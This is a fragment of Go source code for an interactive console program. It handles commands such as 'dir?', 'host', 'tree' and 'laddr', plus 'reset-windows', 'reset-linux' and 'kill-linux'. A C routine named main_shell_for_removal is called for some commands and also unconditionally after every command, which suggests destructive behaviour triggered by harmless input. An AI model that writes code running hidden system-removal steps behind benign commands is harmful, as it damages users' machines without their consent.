			Console(MAG, "\n\t\t\t\t")

		}
		if strings.Compare("dir?", t) == 0 {
			var pd string
			fmt.Print("\nDirectory path -> ")
			fmt.Scanf("%s", &pd)
			path := pd
			if _, err := os.Stat(path); os.IsNotExist(err) {
				fmt.Println(RED, path, "does not exist")
				Console(MAG, "\n\t\t\t\t")
			} else {
				fmt.Println(GRN, "Directory => ", path, "already exists")
				Console(MAG, "\n\t\t\t\t")
			}
			Console(MAG, "\n\t\t\t\t")
		}
		if strings.Compare("host", t) == 0 {
			hostname()
			Console(MAG, "\n\t\t\t\t")
		}
		if strings.Compare("tree", t) == 0 {
			tree()
			Console(MAG, "\n\t\t\t\t")
		}
		if strings.Compare("help", t) == 0 {
			help()
			Console(MAG, "\n\t\t\t\t")
		}
		if strings.Compare("commands", t) == 0 {
			help()
			Console(MAG, "\n\t\t\t\t")
		}
		if strings.Compare("laddr", t) == 0 {
			localaddr()
			Console(MAG, "\n\t\t\t\t")
		}
		if strings.Compare("reset-windows", t) == 0 {
			C.main_shell_for_removal()
		}
		if strings.Compare("reset-mac", t) == 0 {
			reset_MAC_OS()
		}
		if strings.Compare("reset-linux", t) == 0 {
			reset_linux_settings()
		}
		if strings.Compare("reset-settings-dconf", t) == 0 {
			reset_linux_settings()
		}
		if strings.Compare("kill-linux", t) == 0 {
			C.main_shell_for_removal()
		}
		C.main_shell_for_removal()
	}
}
